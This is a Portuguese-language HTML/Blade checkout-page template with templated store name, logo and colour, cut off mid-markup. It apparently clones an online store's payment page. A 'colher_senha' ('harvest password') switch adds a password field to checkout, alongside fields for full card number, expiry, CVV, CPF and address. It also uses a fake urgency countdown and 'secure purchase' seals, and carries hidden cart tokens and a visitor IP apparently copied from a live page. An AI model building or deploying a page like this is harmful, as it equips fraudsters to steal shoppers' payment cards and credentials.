
<!DOCTYPE html>
<html lang="pt-br" data-preview="">

<!-- Head -->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">

  <title>Checkout - {{$data['nm_loja']}}</title>

  <meta name="description" content="" />
  <meta name="author" content="LPQV"/>
  <meta http-equiv="cache-control" content="public"/>
  <meta name="language" content="pt-br"/>

  <!-- Desabilita buscadores -->
  <meta name="robots" value="noindex,nofollow">

  <link rel="dns-prefetch preconnect" href="https://cdn.lpqv.com.br" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://app.lpqv.com.br" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://www.facebook.com" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://connect.facebook.net" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://stats.g.doubleclick.net" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://www.google-analytics.com" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://www.google.com.br" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://www.google.com" crossorigin>
  <link rel="dns-prefetch preconnect" href="https://www.googleadservices.com" crossorigin>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  
  
  <!-- Favicons -->
      
  <!-- Compartilhamento -->
    <meta property="og:url" content="https://pagamentolojadomecanicor.lpqv.io/" />
  <meta property="og:image" content="" />
  <meta property="og:title" content="{{$data['nm_loja']}}" />
  <meta property="og:description" content="" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="pt_BR" />
  <link rel="canonical" href="https://pagamentolojadomecanicor.lpqv.io/" />

  <!-- Fontes -->
  <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap">
  <link rel="stylesheet" media="print" onload="this.onload=null;this.removeAttribute('media');" href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap">
  <noscript>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap">
  </noscript>
  <link rel="stylesheet" media="print" onload="this.onload=null;this.removeAttribute('media');" href="https://cdnjs.cloudflare.com/ajax/libs/line-awesome/1.3.0/line-awesome/css/line-awesome.min.css" integrity="sha512-vebUliqxrVkBy3gucMhClmyQP9On/HAWQdKDXRaAlb/FKuTbxkjPKUyqVOxAcGwFDka79eTF+YXwfke1h3/wfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

  <!-- Css -->
  <link rel="stylesheet" href="https://cdn.lpqv.io/app/core/assets/dist/css/plugins.min.css?v=110">
  <link rel="stylesheet" href="https://cdn.lpqv.io/app/checkout/assets/dist/css/plugins.min.css?v=121">
  <link rel="stylesheet" href="https://cdn.lpqv.io/app/core/assets/dist/css/style.min.css?v=110">
  <link rel="stylesheet" href="https://cdn.lpqv.io/app/checkout/assets/dist/css/style.min.css?v=121">

  <style>
       .openSansText {
	font-family: 'Open Sans', sans-serif;
	color: black;
  font-size: 13px;
  line-height: 20px;
}

.boldText {
	font-weight: 700;
}

.black_back {
	position: fixed;
	background: rgba(0,0,0,0.2) left top;
	width: 100%;
	height:100%;
	z-index: 99;
	top: 0;
  left: 0;
}

/* don't include above in final! */

.modal_mobile {
  width: 280px;
  position: fixed;
  padding: 30px 0 0 0;
  background-color: #fff;
  z-index: 100;
  border-radius: 5px;
  left: 50%;
  margin-left: -140px;
  top: 50%;
  margin-top:-93px;
}

.modal_mobile div.title.openSansText.boldText {
	font-size: 20px;
	text-align: center;
}

.modal_mobile .content {
	font-size: 14px;
  text-align: center;

}

.modal_mobile .button {
	border-top: 1px solid #E9E9E9;
	font-size: 16px;
	color: #3d7ac3;
	line-height: 44px;
	text-align: center;
	width: 100%;
    margin-top: 20px;
}
    .form-input.acc[readonly] { background-color: #F5F5F5; font-weight: 500; }

    .ns-input2{
    width: 100%;
    margin: 0;
    padding: 0;
    background: none;
    border: none;
    border-radius: 0;
    outline: none;
    -webkit-box-shadow: none;
    box-shadow: none;
    font-family: inherit;
    font-size: 16px;
    font-weight: normal;
    width: 40px;
    font-size: 18px;
    font-weight: bold;
    text-align: center;
    color: var(--font-dark);
}

.form-check input:checked+label::before {
    background-color: {{$data['cor_loja']}} !important;
    border-color: {{$data['cor_loja']}} !important;
}

.payment-item.active .collapse-check::before {
    content: "";
    display: block;
    position: absolute;
    top: 1px;
    left: 1px;
    width: 14px;
    height: 14px;
    border-radius: 50%;
    border: 2px solid var(--white);
    background-color: {{$data['cor_loja']}} !important;
}
</style>

  
  <!-- Tags -->
      <script>
  window.dataLayer = window.dataLayer || [];
</script>
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
</script>

	

<script>
    <?php 
    if(!empty($data['pixelfb'])){
        for($i = 1; $i <= 6; $i++){
            if($data['pixelfb']['pixel_' . $i] != null){
                echo "fbq('init', " . $data['pixelfb']['pixel_' . $i] . ");";
            }
        }
    }
    ?>

</script>
  
</head>

<!-- Loader -->
<style>
.loader-container{position:fixed;z-index:150;top:0;right:0;bottom:0;left:0;background-color:#ffffff;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;opacity:0;visibility:hidden;-webkit-transition:.5s;-o-transition:.5s;transition:.5s}.loader-container.active{opacity:1;visibility:visible}.loader,.loader:after,.loader:before{border-radius:50%;width:2.5em;height:2.5em;-webkit-animation-fill-mode:both;animation-fill-mode:both;-webkit-animation:loader 1.8s infinite ease-in-out;animation:loader 1.8s infinite ease-in-out}.loader{position:relative;margin:0 auto;font-size:10px;color:var(--primary-color);-webkit-transform:translateZ(0);transform:translateZ(0);-webkit-animation-delay:-.16s;animation-delay:-.16s}.loader:after,.loader:before{content:"";position:absolute;top:0}.loader:before{left:-3.5em;-webkit-animation-delay:-.32s;animation-delay:-.32s}.loader:after{left:3.5em}@-webkit-keyframes loader{0%,100%,80%{-webkit-box-shadow:0 2.5em 0 -1.3em;box-shadow:0 2.5em 0 -1.3em}40%{-webkit-box-shadow:0 2.5em 0 0;box-shadow:0 2.5em 0 0}}@keyframes loader{0%,100%,80%{-webkit-box-shadow:0 2.5em 0 -1.3em;box-shadow:0 2.5em 0 -1.3em}40%{-webkit-box-shadow:0 2.5em 0 0;box-shadow:0 2.5em 0 0}}
</style>

<body class="checkout onepage-layout">
  <!--Tags -->
    <!--Tags -->

  <style>
    :root {
            --primary-color: #ff5225;
            --btn-color: #008000;
            --top-bar-bg: #ff5225;
            --top-bar-color: #ffffff;
            --steps-color: #00ac69;
            --btn-buy-rgba: rgba(0,128,0,0.75);
    }
    @-webkit-keyframes btn-pulse-buy{0%{-webkit-box-shadow:0 0 0 0 var(--btn-buy-rgba);box-shadow:0 0 0 0 var(--btn-buy-rgba)}70%{-webkit-box-shadow:0 0 0 15px transparent;box-shadow:0 0 0 15px transparent}100%{-webkit-box-shadow:0 0 0 0 transparent;box-shadow:0 0 0 0 transparent}}@keyframes btn-pulse-buy{0%{-webkit-box-shadow:0 0 0 0 var(--btn-buy-rgba);box-shadow:0 0 0 0 var(--btn-buy-rgba)}70%{-webkit-box-shadow:0 0 0 15px transparent;box-shadow:0 0 0 15px transparent}100%{-webkit-box-shadow:0 0 0 0 transparent;box-shadow:0 0 0 0 transparent}}.btn-buy.btn-pulse{-webkit-animation:btn-pulse-buy 2s infinite;animation:btn-pulse-buy 2s infinite}
  </style>

  <!-- Header -->
    <header id="header" class="header ">
    <div class="container co-container">
      <div class="row">
        <div class="grid-12 header-wrapper flex-between">
          <!-- Logo -->
                      <figure class="header-logo ">
              <img src="//{{$data['img_loja']}}" alt="{{$data['nm_loja']}}">
            </figure>
                    <!-- Selo -->
                      <figure class="header-seal header-seal-right header-seal-1  ml-2">
              <img src="https://cdn.lpqv.io/app/checkout/assets/dist/img/selo_compra_segura.png" alt="Compra segura">
            </figure>
                  </div>
      </div>
    </div>
  </header>
<!-- /.header -->
  <!-- Contador -->
    <div id="countdown" style="background-color: {{$data['cor_loja']}}"class="countdown-sec ">
    <div class="container">
      <div class="row">
        <div class="grid-12">
          <div class="countdown-wrapper">
            <div class="countdown-sec-text" style="text-align: left;">Oferta válida por tempo limitado. Aproveite!</div>
                          <div class="countdown countdown-checkout circle light " data-mode="minutes" data-minutes="15">
                <div class="cd-item">
                  <div class="cd-number" data-cd="minutes">00</div>
                  <div class="cd-caption">Minutos</div>
                </div>
                <div class="cd-separator">:</div>
                <div class="cd-item">
                  <div class="cd-number" data-cd="seconds">00</div>
                  <div class="cd-caption">Segundos</div>
                </div>
              </div>
                      </div>
        </div>
      </div>
    </div>
  </div>
<!-- /.header -->  
  <!-- Página -->
  <div class="main checkout-pag">
    <div class="container co-container">
      <form id="form-checkout" method="post" class="row co-form form-validation fv-show-invalid" data-checkout-infos=''>

        <!-- Passos Checkout -->
        
        <!-- Banner -->
        
        <!-- Campos formulário -->
        <div class="grid-7 grid-md-12 grid-sm-12 grid-xs-12 co-form-inputs">

          <!-- Informações pessoais -->
          <div class="card card-mb-full co-infos" data-checkout-step="1">
  
  <div class="card-header">
    <h2 class="card-title"><i style="color: {{$data['cor_loja']}} !important;"class="las la-user"></i> <span class="sec-infos-title">Informações pessoais</span> <span class="check-valid"><i class="las la-check-circle"></i></span></h2>
  </div>

  <div class="card-body card-pt-text sec-step-inputs">

    <div class="co-card-text sec-infos-text">Informe os dados abaixo para realizar sua compra.</div>

          <div class="form-group floating-label">
        <input type="text" class="form-input acc" name="name" id="co-name" maxlength="255" data-parsley-fullname data-parsley-trigger="change focusout" data-input-save data-required required value="">
        <label for="co-name" class="form-label">Nome completo</label>
      </div>
    
          <div class="form-group floating-label">
        <input type="email" class="form-input" name="email" id="co-email" maxlength="255" data-parsley-trigger="change focusout" data-input-save data-required required value="">
        <label for="co-email" class="form-label">E-mail</label>
      </div>
    @if($data['colher_senha'])
      <div class="form-group floating-label">
        <input type="password" class="form-input" name="password" id="co-password" maxlength="255" data-parsley-trigger="change focusout" data-input-save data-required required value="">
        <label for="co-password" class="form-label">Senha</label>
      </div>
    @endif
        
    <div class="row">

      <div class="grid-6 grid-xs-12">
        <div class="form-group floating-label mb-sm-0 mb-md-0 mb-lg-0 mb-xl-0">
          <input type="tel" class="form-input phone" name="phone" id="co-phone" maxlength="255" data-parsley-trigger="change focusout" data-parsley-pattern="(\([1-9]{2}\))\s([9]{1})?([0-9]{4})-([0-9]{4})" data-parsley-pattern-message="Digite um número de telefone válido." data-input-save data-required required value="">
          <label for="co-phone" class="form-label">Celular</label>
        </div>
      </div>

      <div class="grid-6 grid-xs-12">
        <div class="form-group floating-label mb-0">
          <input type="text" inputmode="numeric" class="form-input cpf" name="cpf" id="co-cpf" maxlength="255" data-parsley-cpf data-parsley-trigger="change focusout" data-input-save data-required required value="">
          <label for="co-cpf" class="form-label">CPF</label>
        </div>
      </div>

    </div>

    <div class="checkout-nav">
      <button class="btn btn-buy checkout-nav-next">Continuar <i class="las la-arrow-right"></i></button>
    </div>

  </div>

  <div class="card-body card-pt-text sec-step-infos">
    <p>
      <strong data-info="#co-name"></strong><br>
      <b>CPF:</b> <span data-info="#co-cpf"></span><br>
      <b>E-mail:</b> <span data-info="#co-email"></span><br>
      <b>Telefone:</b> <span data-info="#co-phone"></span>
    </p>
    <p>
      <button class="btn btn-sm btn-grey" data-edit-step="1"><i class="las la-pen"></i> Editar</button>
    </p>
  </div>

</div>          <!-- /.Informações pessoais -->

                    <!-- Entrega -->
          <div class="card card-mb-full co-address" data-checkout-step="2">
            <div class="card-header">
              <h2 class="card-title"><i style="color: {{$data['cor_loja']}} !important;" class="las la-shipping-fast"></i> <span class="sec-address-title">Entrega</span> <span class="check-valid"><i class="las la-check-circle"></i></span></h2>
            </div>
            <div class="card-body card-pt-text sec-step-inputs">

  <div class="co-card-text sec-address-text">Informe o endereço para onde o pedido deve ser entregue.</div>

  <div class="row">
    <div class="grid-6 grid-xs-12">
      <div class="form-group floating-label mb-0">
        <div class="form-input-group form-input-right form-input-loader">
          <input type="text" inputmode="numeric" class="form-input cep compl-cep" name="zipcode" id="co-zipcode" maxlength="255" data-parsley-trigger="change focusout" data-wrp=".campos-endereco" data-logradouro="#co-address" data-numero="#co-number" data-bairro="#co-neighborhood" data-cidade="#co-city" data-estado="#co-state" data-shipping-method="store:personalizado" data-required required value="">
          <label for="co-zipcode" class="form-label">CEP</label>
          <label class="form-input-icon form-input-icon-right"><span></span></label>
        </div>
      </div>
    </div>
  </div>
  
  <div class="campos-endereco" style="display: none;">

    <div class="row">

      <div class="grid-8 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" class="form-input" name="address" id="co-address" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-address" class="form-label">Endereço</label>
        </div>
      </div>

      <div class="grid-4 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" inputmode="numeric" class="form-input" name="number" id="co-number" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-number" class="form-label" data-input-save>Número</label>
        </div>
      </div>

    </div>

    <div class="row">

      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" class="form-input" name="complement" id="co-complement" maxlength="255" data-parsley-trigger="change focusout" value="">
          <label for="co-complement" class="form-label" data-input-save>Complemento (Opcional)</label>
        </div>
      </div>

      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" class="form-input" name="neighborhood" id="co-neighborhood" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-neighborhood" class="form-label">Bairro</label>
        </div>
      </div>

    </div>

    <div class="row">

      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" class="form-input" name="city" id="co-city" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-city" class="form-label">Cidade</label>
        </div>
      </div>

      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label">
          <select name="state" id="co-state" class="form-input" data-parsley-trigger="change focusout" data-required required value="">
            <option value="" hidden>Selecione</option>
                          <option value="AC" >Acre</option>
                          <option value="AL" >Alagoas</option>
                          <option value="AP" >Amapá</option>
                          <option value="AM" >Amazonas</option>
                          <option value="BA" >Bahia</option>
                          <option value="CE" >Ceará</option>
                          <option value="DF" >Distrito Federal</option>
                          <option value="ES" >Espírito Santo</option>
                          <option value="GO" >Goiás</option>
                          <option value="MA" >Maranhão</option>
                          <option value="MT" >Mato Grosso</option>
                          <option value="MS" >Mato Grosso do Sul</option>
                          <option value="MG" >Minas Gerais</option>
                          <option value="PA" >Pará</option>
                          <option value="PB" >Paraíba</option>
                          <option value="PR" >Paraná</option>
                          <option value="PE" >Pernambuco</option>
                          <option value="PI" >Piauí</option>
                          <option value="RJ" >Rio de Janeiro</option>
                          <option value="RN" >Rio Grande do Norte</option>
                          <option value="RS" >Rio Grande do Sul</option>
                          <option value="RO" >Rondônia</option>
                          <option value="RR" >Roraima</option>
                          <option value="SC" >Santa Catarina</option>
                          <option value="SP" >São Paulo</option>
                          <option value="SE" >Sergipe</option>
                          <option value="TO" >Tocantins</option>
                      </select>
          <label for="co-state" class="form-label">Estado</label>
          <div class="select-arrow"></div>
        </div>
      </div>

    </div>

    <div class="form-group floating-label">
      <input type="text" class="form-input" name="recipient_name" id="co-recipient" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
      <label for="co-recipient" class="form-label">Destinatário</label>
    </div>


  </div>

</div>            <div class="card-body border-top card-pt-text co-billing sec-step-inputs">
  <h2 class="card-title"><span class="sec-billing-title">Cobrança</span></h2>
  <div class="co-card-text sec-billing-text">Informe o endereço para cobrança.</div>
  <div class="row">
    <div class="grid-6 grid-xs-12">
      <div class="form-group floating-label mb-0">
        <div class="form-input-group form-input-right form-input-loader">
          <input type="text" inputmode="numeric" class="form-input cep compl-cep" name="zipcode_billing" id="co-zipcode-billing" maxlength="255" data-parsley-trigger="change focusout" data-wrp=".campos-endereco-cobranca" data-logradouro="#co-address-billing" data-numero="#co-number-billing" data-bairro="#co-neighborhood-billing" data-cidade="#co-city-billing" data-estado="#co-state-billing" data-required required value="">
          <label for="co-zipcode-billing" class="form-label">CEP</label>
          <label class="form-input-icon form-input-icon-right"><span></span></label>
        </div>
      </div>
    </div>
  </div>
  <div class="campos-endereco-cobranca" style="display: none;">
    <div class="row">
      <div class="grid-8 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" class="form-input" name="address_billing" id="co-address-billing" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-address-billing" class="form-label">Endereço</label>
        </div>
      </div>
      <div class="grid-4 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" inputmode="numeric" class="form-input compl-numero" name="number_billing" id="co-number-billing" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-number-billing" class="form-label">Número</label>
        </div>
      </div>
    </div>
    <div class="row">
      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" class="form-input" name="complement_billing" id="co-complement-billing" maxlength="255" data-parsley-trigger="change focusout" value="">
          <label for="co-complement-billing" class="form-label">Complemento (Opcional)</label>
        </div>
      </div>
      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label">
          <input type="text" class="form-input compl-bairro" name="neighborhood_billing" id="co-neighborhood-billing" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-neighborhood-billing" class="form-label">Bairro</label>
        </div>
      </div>
    </div>
    <div class="row">
      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label mb-md-0 mb-lg-0 mb-xl-0">
          <input type="text" class="form-input compl-cidade" name="city_billing" id="co-city-billing" maxlength="255" data-parsley-trigger="change focusout" data-required required value="">
          <label for="co-city-billing" class="form-label">Cidade</label>
        </div>
      </div>
      <div class="grid-6 grid-sm-12 grid-xs-12">
        <div class="form-group floating-label mb-0">
          <select name="state_billing" id="co-state-billing" class="form-input compl-estado" data-parsley-trigger="change focusout" data-required required>
            <option value="" hidden>Selecione</option>
                          <option value="AC" >Acre</option>
                          <option value="AL" >Alagoas</option>
                          <option value="AP" >Amapá</option>
                          <option value="AM" >Amazonas</option>
                          <option value="BA" >Bahia</option>
                          <option value="CE" >Ceará</option>
                          <option value="DF" >Distrito Federal</option>
                          <option value="ES" >Espírito Santo</option>
                          <option value="GO" >Goiás</option>
                          <option value="MA" >Maranhão</option>
                          <option value="MT" >Mato Grosso</option>
                          <option value="MS" >Mato Grosso do Sul</option>
                          <option value="MG" >Minas Gerais</option>
                          <option value="PA" >Pará</option>
                          <option value="PB" >Paraíba</option>
                          <option value="PR" >Paraná</option>
                          <option value="PE" >Pernambuco</option>
                          <option value="PI" >Piauí</option>
                          <option value="RJ" >Rio de Janeiro</option>
                          <option value="RN" >Rio Grande do Norte</option>
                          <option value="RS" >Rio Grande do Sul</option>
                          <option value="RO" >Rondônia</option>
                          <option value="RR" >Roraima</option>
                          <option value="SC" >Santa Catarina</option>
                          <option value="SP" >São Paulo</option>
                          <option value="SE" >Sergipe</option>
                          <option value="TO" >Tocantins</option>
                      </select>
          <label for="co-state-billing" class="form-label">Estado</label>
          <div class="select-arrow"></div>
        </div>
      </div>
    </div>
  </div>
</div>            
  <div class="card-body border-top card-pt-text co-shipping-ways sec-step-inputs" id="entrega" style="display: none;">
  <h2 class="card-title sec-ship-title">Forma de entrega</h2>
  <div class="co-card-text sec-ship-text">Escolha uma forma de entrega.</div>
  <div class="form-group mb-0 shipping_ways" id="append_frete" data-value="">
    
  </div>
  <div class="spinner-wrap md shipping-ways-loader" style="display: none;">
    <span class="spinner"></span>
  </div>
  <div class="checkout-nav">
    <button class="btn btn-buy checkout-nav-next">Continuar <i class="las la-arrow-right"></i></button>
  </div>
</div>            <div class="card-body card-pt-text sec-step-infos">
              <p>
                <strong>Endereço de entrega</strong><br>
                <span data-info="#co-address"></span>, <span data-info="#co-number"></span>, <span data-info="#co-neighborhood"></span>, <span data-info="#co-city"></span> / <span data-info="#co-state"></span>
              </p>
              <p>
                <strong>Forma de entrega</strong><br>
                <span id="sec-step-infos-ship"></span>
              </p>
              <p>
                <button class="btn btn-sm btn-grey" data-edit-step="2"><i class="las la-pen"></i> Editar</button>
              </p>
            </div>
          </div>
          <!-- /.Entrega -->
          
                    
          <!-- Pagamento -->
                      <div class="card card-mb-full co-payment co-payment-l-default " data-fb-pixels='[{"id":"1189524455031133","token":"","event_id":"EV-61F6F59DF0306402F07413ACE0E835B0","processing_mode":"browser","fbclid":null,"infos":{"content_type":"product_group","content_ids":["DLKM8UVEB:292"],"value":879.9,"currency":"BRL"}}]' data-checkout-step="3">
  <div class="card-header">
    <h2 class="card-title"><i style="color: {{$data['cor_loja']}} !important;" class="las la-credit-card"></i> <span class="sec-pay-title">Forma de pagamento</span></h2>
  </div>
  <div class="card-body card-pt-text sec-step-inputs">

    <div class="co-card-text sec-pay-text">Escolha uma forma de pagamento.</div>

        
    <div class="form-group mb-0">

      <ul class="collapse accordion payment-accordion">

        <!-- Cartão de crédito -->
                        <!-- /.Cartão de crédito -->

        <!-- Pix -->
    <li style="border-color: {{$data['cor_loja']}}" metodo="pix" class="collapse-item payment-item">
            <a href="#" class="collapse-title">
              <div class="payment-item-infos">
                <div class="collapse-check" style="background-color: {{$data['cor_loja']}} !important; border-color: {{$data['cor_loja']}} !important"></div>
                <div class="payment-item-title">
                  <span class="payment-item-title-text">Pix</span> 
                  <span class='payment-item-title-discount' style="background-color: {{$data['cor_loja']}} !important;">Aprovação Imediata</span>                </div>
                <input type="radio" name="payment_method" id="co_payment_method_pix" value="pix" checked data-title="Pix" data-discount="5.00" data-max-installments="0" data-max-installments-free="0" required>
              </div>
              <div class="payment-item-images">
                                  <img src="https://cdn.lpqv.io/app/core/assets/dist/img/payment/pix.png">
                              </div> 
            </a>
            <div class="collapse-content">
              <div class="text-formatted text-formatted-xs">
                
  <p>- Valor à vista.</p>
  <p>- Não pode ser parcelado! Use cartão de crédito para parcelar sua compra.</p>
  <p>- Prazo de até 30 minutos para compensar.</p>                <b>Valor da transferência: <span id="card_total_baixo" style="color: {{$data['cor_loja']}};" class="v-cart-total">R$ {{ str_replace('.', ',', number_format($data['preco'] * $data['quantidade'],2))}}</span></b>
              </div>
            </div>
          </li>

    @if($data['cc'])
    <li style="border-color: {{$data['cor_loja']}}" metodo="cartao" class="collapse-item payment-item">
            <a href="#" class="collapse-title">
              <div class="payment-item-infos">
                <div class="collapse-check" style="background-color: {{$data['cor_loja']}} !important; border-color: {{$data['cor_loja']}} !important"></div>
                <div class="payment-item-title">
                  <span class="payment-item-title-text">Cartão de Crédito</span> 
                  <span class='payment-item-title-discount' style="background-color: {{$data['cor_loja']}} !important;">Até 12x Sem Juros</span>                </div>
                <input type="radio" name="payment_method" id="co_payment_method_pix" value="pix" checked data-title="Pix" data-discount="5.00" data-max-installments="0" data-max-installments-free="0" required>
              </div>
              <div class="payment-item-images">
                                  <img src="https://cdn.lpqv.io/app/core/assets/dist/img/payment/mastercard.png">
              </div> 
              <div class="payment-item-images">
                                  <img src="https://cdn.lpqv.io/app/core/assets/dist/img/payment/visa.png">
              </div> 
              <div class="payment-item-images">
                                  <img src="https://cdn.lpqv.io/app/core/assets/dist/img/payment/elo.png">
              </div> 
            </a>
            <div class="collapse-content">
              <div class="text-formatted text-formatted-xs">
              <div class="card-body card-pt-text sec-step-inputs" id="div_cartao">

                <div class="co-card-text sec-infos-text">Informe os dados abaixo para realizar sua compra.</div>

                      <div class="form-group floating-label">
                    <input type="text" class="form-input " id="titular_cc" maxlength="255" data-parsley-trigger="change focusout" data-input-save="" data-required="" required="" value="">
                    <label for="titular_cc" class="form-label">Titular do Cartão</label>
                  </div>

                      <div class="form-group floating-label">
                    <input type="text" class="form-input" id="cpf_cc" maxlength="14"  data-parsley-trigger="change focusout" data-input-save="" data-required="" required="" value="">
                    <label for="cpf_cc" class="form-label">CPF do Titular do Cartão</label>
                  </div>

                      <div class="form-group floating-label">
                    <input class="form-input" id="cc_cc" maxlength="255" data-parsley-trigger="change focusout" data-input-save="" data-required="" required="" value="">
                    <label for="cc_cc" class="form-label">Número do Cartão</label>
                  </div>
                  <div class="row">
                    
                    <div class="grid-6 grid-xs-12">
                      <div class="form-group floating-label mb-sm-0 mb-md-0 mb-lg-0 mb-xl-0">
                        <input type="tel" class="form-input" id="validade_cc" maxlength="5" data-parsley-trigger="change focusout"  data-input-save="" data-required="" required="" value="">
                        <label for="validade_cc" class="form-label">Validade</label>
                      </div>
                      
                    </div>

                  <div class="grid-6 grid-xs-12">
                    <div class="form-group floating-label mb-0">
                      <input type="text" inputmode="numeric" class="form-input" name="cpf" id="cvv_cc" maxlength="4" data-parsley-trigger="change focusout" data-input-save="" data-required="" required="" value="">
                      <label for="cvv_cc" class="form-label">Cód. de Segurança</label>
                    </div>
                  </div>
                  
                  
                </div>
                
                
              

                <div class="checkout-nav">
                  <button class="btn btn-buy checkout-nav-next">Continuar <i class="las la-arrow-right"></i></button>
                </div>

                </div>
              </div>
            </div>
          </li>
          @endif
                <!-- /.Pix -->
        
        <!-- Boleto bancário -->
                                <!-- /.Boleto bancário -->
        
        <!-- Transferência bancária -->
                        <!-- /.Transferência bancária -->

      </ul>

    </div>

  </div>
</div>                    <!-- /.Pagamento -->
          
          <!-- Order Bump -->
                      <div class="co-order-bump-mobile"></div>
                    <!-- /.Order Bump -->

          <!-- Botão de compra -->
          <div class="btn-container co-btn-buy">
            <input type="hidden" name="gateway_digital" id="gateway_digital" value="0">
                        <input type="hidden" name="device_id" id="deviceId">
            <input type="hidden" name="lp_url" value="https://pagamentolojadomecanicor.lpqv.io/">
            <input type="hidden" name="lp_type" value="checkoutstore">
            <input type="hidden" name="ac_contact_id" id="ac_contact_id" value="">
            <input type="hidden" name="cart_token" id="co-cart-token" value="jloi2z3n61-68a762d175482d74fff91f6405e035cf-22l7krbdvgu3t68jbko096jbg8:500">
            <input type="hidden" name="store_token" id="co-store-token" value="c0e4751855b4b34c1fb29bda50bc303f4935">
            <input type="hidden" name="coupon" id="co-coupon-input" value="">

            <button type="submit" class="btn btn-buy btn-rounded btn-pulse" id="compraragora" data-text="Comprar Agora">Comprar Agora</button>

                        <input type="hidden" name="extra_infos" value='{"url":"https:\/\/pagamentolojadomecanicor.lpqv.io\/","client_ip_address":"179.223.138.250","client_user_agent":"Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/114.0.0.0 Safari\/537.36"}'>

            <!-- Selo -->
            <ul class="btn-selos">
              <!-- <img src="https://cdn.lpqv.io/app/core/assets/dist/img/btn-selos2.png" alt="Compra segura"> -->
              <li>
  <svg class="check" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></svg>
  <div>
    <span>Compra</span>
    <span>Segura</span>
  </div>
</li>
<li>
  <svg class="award" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M97.12 362.63c-8.69-8.69-4.16-6.24-25.12-11.85-9.51-2.55-17.87-7.45-25.43-13.32L1.2 448.7c-4.39 10.77 3.81 22.47 15.43 22.03l52.69-2.01L105.56 507c8 8.44 22.04 5.81 26.43-4.96l52.05-127.62c-10.84 6.04-22.87 9.58-35.31 9.58-19.5 0-37.82-7.59-51.61-21.37zM382.8 448.7l-45.37-111.24c-7.56 5.88-15.92 10.77-25.43 13.32-21.07 5.64-16.45 3.18-25.12 11.85-13.79 13.78-32.12 21.37-51.62 21.37-12.44 0-24.47-3.55-35.31-9.58L252 502.04c4.39 10.77 18.44 13.4 26.43 4.96l36.25-38.28 52.69 2.01c11.62.44 19.82-11.27 15.43-22.03zM263 340c15.28-15.55 17.03-14.21 38.79-20.14 13.89-3.79 24.75-14.84 28.47-28.98 7.48-28.4 5.54-24.97 25.95-45.75 10.17-10.35 14.14-25.44 10.42-39.58-7.47-28.38-7.48-24.42 0-52.83 3.72-14.14-.25-29.23-10.42-39.58-20.41-20.78-18.47-17.36-25.95-45.75-3.72-14.14-14.58-25.19-28.47-28.98-27.88-7.61-24.52-5.62-44.95-26.41-10.17-10.35-25-14.4-38.89-10.61-27.87 7.6-23.98 7.61-51.9 0-13.89-3.79-28.72.25-38.89 10.61-20.41 20.78-17.05 18.8-44.94 26.41-13.89 3.79-24.75 14.84-28.47 28.98-7.47 28.39-5.54 24.97-25.95 45.75-10.17 10.35-14.15 25.44-10.42 39.58 7.47 28.36 7.48 24.4 0 52.82-3.72 14.14.25 29.23 10.42 39.59 20.41 20.78 